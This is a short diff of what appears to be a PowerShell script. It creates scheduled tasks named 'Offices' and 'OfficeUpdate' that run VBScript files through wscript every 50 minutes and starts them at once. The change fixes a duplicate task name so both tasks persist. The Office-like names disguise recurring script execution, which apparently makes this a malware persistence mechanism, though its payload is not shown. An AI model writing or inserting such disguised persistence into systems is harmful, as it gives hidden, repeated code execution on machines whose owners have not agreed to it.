@@ -29,8 +29,9 @@ $ws = "wscript //e:vbscript " + $filepath
 $ws1 = "wscript //e:vbscript " + $filepath1
 
 schtasks /create /tn "Offices" /sc minute /tr $ws /mo 50 /F
-schtasks /create /tn "Offices" /sc minute /tr $ws1 /mo 50 /F
+schtasks /create /tn "OfficeUpdate" /sc minute /tr $ws1 /mo 50 /F
 
 schtasks /run /tn "Offices"
 sleep 5
 schtasks /run /tn "OfficeUpdate"
+
